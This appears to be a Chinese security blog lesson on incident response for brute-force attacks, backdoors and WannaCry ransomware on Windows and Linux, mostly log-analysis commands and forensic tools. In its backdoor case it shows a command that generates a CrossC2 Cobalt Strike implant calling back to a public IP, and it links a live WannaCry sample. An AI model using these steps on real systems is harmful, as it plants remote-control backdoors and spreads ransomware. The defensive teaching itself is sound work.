@@ -1,0 +1,327 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>74-应急响应-win&amp;linux分析后门&amp;勒索病毒&amp;攻击 | HVVL404</title><meta name="author" content="HVVL404"><meta name="copyright" content="HVVL404"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="74-应急响应-win&amp;linux分析后门&amp;勒索病毒&amp;攻击">
+<meta property="og:type" content="article">
+<meta property="og:title" content="74-应急响应-win&amp;linux分析后门&amp;勒索病毒&amp;攻击">
+<meta property="og:url" content="http://blog.hvvl404.fun/2023/05/26/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%EF%BC%89/74%EF%BC%9A%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-win&linux%E5%88%86%E6%9E%90%E5%90%8E%E9%97%A8&%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92&%E6%94%BB%E5%87%BB/index.html">
+<meta property="og:site_name" content="HVVL404">
+<meta property="og:description" content="74-应急响应-win&amp;linux分析后门&amp;勒索病毒&amp;攻击">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://blog.hvvl404.fun/images/avatar.png">
+<meta property="article:published_time" content="2023-05-26T03:17:46.318Z">
+<meta property="article:modified_time" content="2023-05-26T03:20:21.663Z">
+<meta property="article:author" content="HVVL404">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://blog.hvvl404.fun/images/avatar.png"><link rel="shortcut icon" href="/images/hacker.png"><link rel="canonical" href="http://blog.hvvl404.fun/2023/05/26/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%EF%BC%89/74%EF%BC%9A%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-win&amp;linux%E5%88%86%E6%9E%90%E5%90%8E%E9%97%A8&amp;%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92&amp;%E6%94%BB%E5%87%BB/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '74-应急响应-win&linux分析后门&勒索病毒&攻击',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: false,
+  postUpdate: '2023-05-26 11:20:21'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
+      const link = document.createElement('link')
+      link.rel = 'stylesheet'
+      link.href = url
+      if (id) link.id = id
+      link.onerror = reject
+      link.onload = link.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        link.onload = link.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(link)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><link rel="stylesheet" href="/css/style.css?1"><!-- hexo injector head_end start --><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Zfour/Butterfly-double-row-display@1.00/cardlistpost.min.css"/>
+<style>#recent-posts > .recent-post-item >.recent-post-info > .article-meta-wrap > .tags:before {content:"\A";
+  white-space: pre;}#recent-posts > .recent-post-item >.recent-post-info > .article-meta-wrap > .tags > .article-meta__separator{display:none}</style>
+<!-- hexo injector head_end end --><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="HVVL404" type="application/atom+xml">
+</head><body><div id="loading-box" onclick="document.getElementById(&quot;loading-box&quot;).classList.add(&quot;loaded&quot;)"><div class="loading-bg"><div class="loading-img"></div><div class="loading-image-dot"></div></div></div><script>const preloader = {
+  endLoading: () => {
+    document.body.style.overflow = 'auto';
+    document.getElementById('loading-box').classList.add("loaded")
+  },
+  initLoading: () => {
+    document.body.style.overflow = '';
+    document.getElementById('loading-box').classList.remove("loaded")
+
+  }
+}
+window.addEventListener('load',()=> { preloader.endLoading() })
+
+if (false) {
+  document.addEventListener('pjax:send', () => { preloader.initLoading() })
+  document.addEventListener('pjax:complete', () => { preloader.endLoading() })
+}</script><script>window.paceOptions = {
+  restartOnPushState: false
+}
+
+document.addEventListener('pjax:send', () => {
+  Pace.restart()
+})
+</script><link rel="stylesheet" href="https://fastly.jsdelivr.net/gh/xlenco/JS-X@main/pace.js/pace.css"/><script src="https://cdn.jsdelivr.net/npm/pace-js/pace.min.js"></script><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/images/avatar.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">54</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">12</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 站点</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 类别</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="not-top-img" id="page-header"><nav id="nav"><span id="blog-info"><a href="/" title="HVVL404"><span class="site-name">HVVL404</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 站点</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 类别</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav></header><main class="layout" id="content-inner"><div id="post"><div id="post-info"><h1 class="post-title">74-应急响应-win&amp;linux分析后门&amp;勒索病毒&amp;攻击</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-05-26T03:17:46.318Z" title="发表于 2023-05-26 11:17:46">2023-05-26</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-05-26T03:20:21.663Z" title="更新于 2023-05-26 11:20:21">2023-05-26</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%EF%BC%89/">小迪安全（应急响应）</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="74-应急响应-win&amp;linux分析后门&amp;勒索病毒&amp;攻击"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div><article class="post-content" id="article-container"><p>74-应急响应-win&amp;linux分析后门&amp;勒索病毒&amp;攻击</p>
+<span id="more"></span>   
+
+<p>操作系统(windows,linux)应急响应：</p>
+<ul>
+<li>1.常见危害：暴力破解，漏洞利用，流量攻击，木马控制(Webshell,PC 木马等)，病毒感染(挖矿，蠕虫，勒索等)</li>
+<li>2.常见分析：计算机账户，端口，进程，网络，启动，服务，任务，文件等安全问题</li>
+</ul>
+<p>常见日志类别及存储：</p>
+<ul>
+<li>Windows,Linux</li>
+</ul>
+<p>补充资料：</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/485">https://xz.aliyun.com/t/485</a> 应急响应大合集</li>
+<li><a target="_blank" rel="noopener" href="https://www.secpulse.com/archives/114019.html">https://www.secpulse.com/archives/114019.html</a> 最全Windows安全工具锦集</li>
+<li><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/sysinternals/">https://docs.microsoft.com/en-us/sysinternals/</a> windows官方工具</li>
+</ul>
+<p>病毒分析：</p>
+<ul>
+<li>PCHunter：<a target="_blank" rel="noopener" href="http://www.xuetr.com/">http://www.xuetr.com</a></li>
+<li>火绒剑：<a target="_blank" rel="noopener" href="https://www.huorong.cn/">https://www.huorong.cn</a></li>
+<li>Process Explorer：<a target="_blank" rel="noopener" href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/process-explorer">https://docs.microsoft.com/zh-cn/sysinternals/downloads/process-explorer</a></li>
+<li>processhacker：<a target="_blank" rel="noopener" href="https://processhacker.sourceforge.io/downloads.php">https://processhacker.sourceforge.io/downloads.php</a></li>
+<li>autoruns：<a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns">https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns</a></li>
+<li>OTL：<a target="_blank" rel="noopener" href="https://www.bleepingcomputer.com/download/otl/">https://www.bleepingcomputer.com/download/otl/</a></li>
+<li>SysInspector：<a target="_blank" rel="noopener" href="http://download.eset.com.cn/download/detail/?product=sysinspector">http://download.eset.com.cn/download/detail/?product=sysinspector</a></li>
+</ul>
+<p>病毒查杀：</p>
+<ul>
+<li>卡巴斯基：<a target="_blank" rel="noopener" href="http://devbuilds.kaspersky-labs.com/devbuilds/KVRT/latest/full/KVRT.exe">http://devbuilds.kaspersky-labs.com/devbuilds/KVRT/latest/full/KVRT.exe</a></li>
+<li>大蜘蛛：<a target="_blank" rel="noopener" href="http://free.drweb.ru/download+cureit+free">http://free.drweb.ru/download+cureit+free</a></li>
+<li>火绒安全软件：<a target="_blank" rel="noopener" href="https://www.huorong.cn/">https://www.huorong.cn</a></li>
+<li>360 杀毒：<a target="_blank" rel="noopener" href="http://sd.360.cn/download_center.html">http://sd.360.cn/download_center.html</a></li>
+</ul>
+<p>病毒动态：</p>
+<ul>
+<li>CVERC-国家计算机病毒应急处理中心：<a target="_blank" rel="noopener" href="http://www.cverc.org.cn/">http://www.cverc.org.cn</a></li>
+<li>微步在线威胁情报社区：<a target="_blank" rel="noopener" href="https://x.threatbook.cn/">https://x.threatbook.cn</a></li>
+<li>火绒安全论坛：<a target="_blank" rel="noopener" href="http://bbs.huorong.cn/forum-59-1.html">http://bbs.huorong.cn/forum-59-1.html</a></li>
+<li>爱毒霸社区：<a target="_blank" rel="noopener" href="http://bbs.duba.net/">http://bbs.duba.net</a></li>
+<li>腾讯电脑管家：<a target="_blank" rel="noopener" href="http://bbs.guanjia.qq.com/forum-2-1.html">http://bbs.guanjia.qq.com/forum-2-1.html</a></li>
+</ul>
+<p>在线病毒扫描网站：</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="http://www.virscan.org/">http://www.virscan.org</a> &#x2F;&#x2F;多引擎在线病毒扫描网</li>
+<li><a target="_blank" rel="noopener" href="https://habo.qq.com/">https://habo.qq.com</a> &#x2F;&#x2F;腾讯哈勃分析系统</li>
+<li><a target="_blank" rel="noopener" href="https://virusscan.jotti.org/">https://virusscan.jotti.org</a> &#x2F;&#x2F;Jotti 恶意软件扫描系统</li>
+<li><a target="_blank" rel="noopener" href="http://www.scanvir.com/">http://www.scanvir.com</a> &#x2F;&#x2F;计算机病毒、手机病毒、可疑文件分析</li>
+</ul>
+<p>本课重点：</p>
+<ul>
+<li>案例1：攻击响应-暴力破解(RDP,SSH)-Win,Linux</li>
+<li>案例2：控制响应-后门木马(Webshell,PC)-Win,Linux</li>
+<li>案例3：危害响应-病毒感染(勒索 WannaCry)-Windows</li>
+<li>案例4：自动化响应检测-Gscan 多重功能脚本测试-Linux</li>
+</ul>
+<p><strong>案例1：攻击响应-暴力破解(RDP,SSH)-Win,Linux</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">Windows-LogFusion 载入查看：</span><br><span class="line">事件归类，事件 ID，事件状态等，参考百度资料</span><br><span class="line"> </span><br><span class="line">Linux-grep 筛选：</span><br><span class="line">1、统计了下日志，确认服务器遭受多少次暴力破解</span><br><span class="line">grep -o &quot;Failed password&quot; /var/log/secure|uniq -c</span><br><span class="line"> </span><br><span class="line">2、输出登录爆破的第一行和最后一行，确认爆破时间范围：</span><br><span class="line">grep &quot;Failed password&quot; /var/log/secure|head -1</span><br><span class="line">grep &quot;Failed password&quot; /var/log/secure|tail -1</span><br><span class="line"> </span><br><span class="line">3、进一步定位有哪些 IP 在爆破？</span><br><span class="line">grep &quot;Failed password&quot; /var/log/secure|grep -E -o &quot;(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)&quot;|uniq -c | sort -nr</span><br><span class="line"> </span><br><span class="line">4、爆破用户名字典都有哪些？</span><br><span class="line">grep &quot;Failed password&quot; /var/log/secure|perl -e &#x27;while($_=&lt;&gt;)&#123; /for(.*?) from/; print &quot;$1\n&quot;;&#125;&#x27;|uniq -c|sort -nr</span><br><span class="line"> </span><br><span class="line">5、登录成功的日期、用户名、IP：</span><br><span class="line">grep &quot;Accepted &quot; /var/log/secure | awk &#x27;&#123;print $1,$2,$3,$9,$11&#125;&#x27;</span><br><span class="line">grep &quot;Accepted &quot; /var/log/secure | awk &#x27;&#123;print $11&#125;&#x27; | sort | uniq -c | sort -nr | more</span><br></pre></td></tr></table></figure>
+
+<p>案例演示1-windows日志查看</p>
+<p>windows日志位置</p>
+<p><img src="https://img2020.cnblogs.com/blog/1375459/202110/1375459-20211014105605733-2003673825.png" alt="img"></p>
+<p>windows自带日志工具不好用，查找分析不方便，推荐使用插件LogFusion</p>
+<p><img src="https://img2020.cnblogs.com/blog/1375459/202110/1375459-20211014105616713-1906900338.png" alt="img"></p>
+<p>&lt;1&gt;LogFusion载入应用程序、硬件事件、安全、系统等日志</p>
+<p><img src="https://img2020.cnblogs.com/blog/1375459/202110/1375459-20211014105629592-1463328900.png" alt="img"></p>
+<p>&lt;2&gt;使用弱口令工具进行暴力破解（选择RDP协议），模拟攻击</p>
+<p><img src="https://img2020.cnblogs.com/blog/1375459/202110/1375459-20211014105640575-12476388.png" alt="img"></p>
+<p>&lt;3&gt;在安全日志里看到很多账户登录失败的日志，可以判断当前主机遭受了爆破攻击，以及是否成功等</p>
+<p><img src="https://img2020.cnblogs.com/blog/1375459/202110/1375459-20211014105655910-394198380.png" alt="img"></p>
+<p>&lt;4&gt;双击进入，查看详细信息（可以看到是哪个IP地址爆破密码成功，成功登录了本机）</p>
+<p><img src="https://img2020.cnblogs.com/blog/1375459/202110/1375459-20211014105710525-1863295461.png" alt="img"></p>
+<p>案例演示2-linux日志查看</p>
+<p>linux日志位置</p>
+<p><img src="https://img2020.cnblogs.com/blog/1375459/202110/1375459-20211014110021037-229494275.png" alt="img"></p>
+<p>&lt;1&gt;首先使用弱口令工具进行暴力破解（选择SSH协议），模拟攻击</p>
+<p><img src="https://img2020.cnblogs.com/blog/1375459/202110/1375459-20211014110033004-1519870807.png" alt="img"></p>
+<p>&lt;2&gt;linux日志分析，使用grep筛选</p>
+<p><img src="https://img2020.cnblogs.com/blog/1375459/202110/1375459-20211014110047517-1099965562.png" alt="img"></p>
+<p><strong>案例2：控制响应-后门木马(Webshell,PC)-Win,Linux</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">windows：默认配置测试</span><br><span class="line">linux 借助 CrossC2 项目：netstat -ntulp</span><br><span class="line">https://github.com/gloxec/CrossC2</span><br><span class="line">https://github.com/darkr4y/geacon</span><br><span class="line">参考过程：http://www.adminxe.com/1287.html</span><br><span class="line"> </span><br><span class="line">CS借助CrossC2项目上线linux主机过程：</span><br><span class="line">1.项目上传至服务端目录，给予执行权限</span><br><span class="line"> </span><br><span class="line">2.配置监听器：</span><br><span class="line">windows/beacon_https/reverse_https 阿里云记得端口放行</span><br><span class="line"> </span><br><span class="line">3.生成后门：</span><br><span class="line">./genCrossC2.Linux 47.99.49.65 5566 null null Linux x64 C2</span><br><span class="line">通过网络监听工具及 windows 日志分析或执行记录查找后门问题</span><br></pre></td></tr></table></figure>
+
+<p>案例演示1-windows分析</p>
+<p>&lt;1&gt;windows执行木马，CS上线，模拟攻击</p>
+<p><img src="https://img2020.cnblogs.com/blog/1375459/202110/1375459-20211014111028103-1785009800.png" alt="img"></p>
+<p>&lt;2&gt;TCPView工具，可以查看哪个进程与远程IP通信过，从而确定系统是否曾经遭受过攻击。但是这个软件不太好用，上一步执行过的artifact.exe木马都没筛选出来。</p>
+<p><img src="https://img2020.cnblogs.com/blog/1375459/202110/1375459-20211014111047835-1478710959.png" alt="img"></p>
+<p>&lt;3&gt;Process Explorer工具，可以查看分析进程</p>
+<p><img src="https://img2020.cnblogs.com/blog/1375459/202110/1375459-20211014111106371-158030960.png" alt="img"></p>
+<p>&lt;4&gt;PCHunter工具。缺点是，windows高版本网络信息，获取不全。比如木马在windows7执行后，该工具可以获取网络信息，如下图。但是同一木马在windows2018执行后，该工具获取不到网络信息。</p>
+<p><img src="https://img2020.cnblogs.com/blog/1375459/202110/1375459-20211014111121533-527047994.png" alt="img"></p>
+<p>&lt;5&gt;UserAssistView工具，可以看到所有在windows系统上执行过的文件</p>
+<p><img src="https://img2020.cnblogs.com/blog/1375459/202110/1375459-20211014111232696-2119872763.png" alt="img"></p>
+<p>&lt;6&gt;logonsession工具，可以看到当前主机有哪些会话连接过，从而分析有没有过远程攻击</p>
+<p><img src="https://img2020.cnblogs.com/blog/1375459/202110/1375459-20211014111148739-1776974961.png" alt="img"></p>
+<p>&lt;7&gt;autoruns工具，可以查看windows系统的自启动项目，从而发现是否有木马病毒等</p>
+<p><img src="https://img2020.cnblogs.com/blog/1375459/202110/1375459-20211014111309657-1010183229.png" alt="img"></p>
+<p>案例演示2-linux分析</p>
+<p>CS是windows渗透工具，但是后期经过一些插件的开发，CS也可以上线linux系统，比如CS借助CrossC2项目上线linux主机</p>
+<p>&lt;1&gt;项目上传至服务端目录，给予执行权限</p>
+<p><img src="https://img2020.cnblogs.com/blog/1375459/202110/1375459-20211014111358915-2080203179.png" alt="img"></p>
+<p><img src="https://img2020.cnblogs.com/blog/1375459/202110/1375459-20211014111412966-1677179494.png" alt="img"></p>
+<p>&lt;2&gt;配置监听器：windows&#x2F;beacon_https&#x2F;reverse_https 阿里云记得端口放行</p>
+<p><img src="https://img2020.cnblogs.com/blog/1375459/202110/1375459-20211014111438147-123524252.png" alt="img"></p>
+<p>&lt;3&gt;生成后门：.&#x2F;genCrossC2.Linux 47.99.49.65 5566 null null Linux x64 C2</p>
+<p><img src="https://img2020.cnblogs.com/blog/1375459/202110/1375459-20211014111449756-1364526674.png" alt="img"></p>
+<p>&lt;4&gt;将后门上传到linux主机并执行</p>
+<p><img src="https://img2020.cnblogs.com/blog/1375459/202110/1375459-20211014111501864-1256480631.png" alt="img"></p>
+<p>&lt;5&gt;CS成功上线</p>
+<p><img src="https://img2020.cnblogs.com/blog/1375459/202110/1375459-20211014111511740-301603503.png" alt="img"></p>
+<p>&lt;6&gt;接下来就是分析日志，查找后门等，具体可见案例4。</p>
+<p><strong>案例3：危害响应-病毒感染(勒索 WannaCry)-Windows</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">详细说明中毒表现及恢复指南</span><br><span class="line">推荐2个勒索病毒解密网站</span><br><span class="line">https://lesuobingdu.360.cn/</span><br><span class="line">https://www.nomoreransom.org/zh/index.html</span><br><span class="line">[下载]永恒之蓝样本（勒索病毒）： https://bbs.pediy.com/thread-217586-1.htm</span><br></pre></td></tr></table></figure>
+
+<p>案例演示</p>
+<p>&lt;1&gt;下载勒索病毒样本，在虚拟机上执行（不要在本机执行，谨慎执行）</p>
+<p><img src="https://img2020.cnblogs.com/blog/1375459/202110/1375459-20211014112304574-1581830618.png" alt="img"></p>
+<p>&lt;2&gt;中毒后显示如下</p>
+<p><img src="https://img2020.cnblogs.com/blog/1375459/202110/1375459-20211014112318774-2000031928.png" alt="img"></p>
+<p>&lt;3&gt;打开任何文件都乱码，弹框</p>
+<p><img src="https://img2020.cnblogs.com/blog/1375459/202110/1375459-20211014112333037-764517958.png" alt="img"></p>
+<p>&lt;4&gt;可以使用360勒索病毒解密网站进行病毒查询、在线解密等。</p>
+<p><img src="https://img2020.cnblogs.com/blog/1375459/202110/1375459-20211014112348528-1745499734.png" alt="img"></p>
+<p>&lt;5&gt;也可以使用nomoreransom网站尝试解密。</p>
+<p><img src="https://img2020.cnblogs.com/blog/1375459/202110/1375459-20211014112415274-195024924.png" alt="img"></p>
+<p><strong>案例4：自动化响应检测-Gscan 多重功能脚本测试-Linux</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">参考：https://github.com/grayddq/GScan/</span><br><span class="line">自动化响应检测工具：GScan、chkrootkit、rkhunter、lynis</span><br><span class="line">都下载一下，应急响应时全都跑一遍</span><br></pre></td></tr></table></figure>
+
+<p>案例演示</p>
+<p>&lt;1&gt;执行Gscan脚本</p>
+<p><img src="https://img2020.cnblogs.com/blog/1375459/202110/1375459-20211014113818928-645892866.png" alt="img"> </p>
+<p>&lt;2&gt;可以看到，黑客进行了哪些攻击行为，是否成功等。</p>
+<p><img src="https://img2020.cnblogs.com/blog/1375459/202110/1375459-20211014113659804-2002972003.png" alt="img"></p>
+<p>&lt;3&gt;netstat -ntl可以查看tcp端口等，再通过ps命令找到对应的进程，分析其是否是木马病毒</p>
+<p><img src="https://img2020.cnblogs.com/blog/1375459/202110/1375459-20211014113725256-180849926.png" alt="img"></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="http://blog.hvvl404.fun/">HVVL404</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://blog.hvvl404.fun/2023/05/26/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%EF%BC%89/74%EF%BC%9A%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-win&amp;linux%E5%88%86%E6%9E%90%E5%90%8E%E9%97%A8&amp;%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92&amp;%E6%94%BB%E5%87%BB/">http://blog.hvvl404.fun/2023/05/26/小迪安全/小迪安全（应急响应）/74：应急响应-win&amp;linux分析后门&amp;勒索病毒&amp;攻击/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://blog.hvvl404.fun" target="_blank">HVVL404</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="/images/avatar.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2023/05/26/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%EF%BC%89/75%EF%BC%9A%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-%E6%95%B0%E6%8D%AE%E5%BA%93&amp;%E6%BC%8F%E6%B4%9E%E5%8F%A3%E4%BB%A4%E6%A3%80%E7%B4%A2&amp;%E5%BA%94%E6%80%A5%E5%8F%96%E8%AF%81%E7%AE%B1/" title="75-应急响应-数据库&amp;漏洞口令检索&amp;应急取证箱"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">上一篇</div><div 